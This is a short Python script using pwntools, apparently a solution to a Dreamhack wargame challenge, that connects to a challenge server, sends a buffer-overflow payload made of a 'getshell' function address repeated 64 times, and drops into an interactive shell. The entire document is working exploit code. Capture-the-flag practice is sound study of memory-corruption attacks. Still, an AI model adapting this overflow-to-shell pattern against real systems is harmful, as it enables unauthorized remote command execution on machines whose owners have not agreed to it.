from pwn import *

p=remote("host3.dreamhack.games",20759)

getshell=0x80485db

payload=p32(getshell)*64

p.sendline(payload)

p.interactive()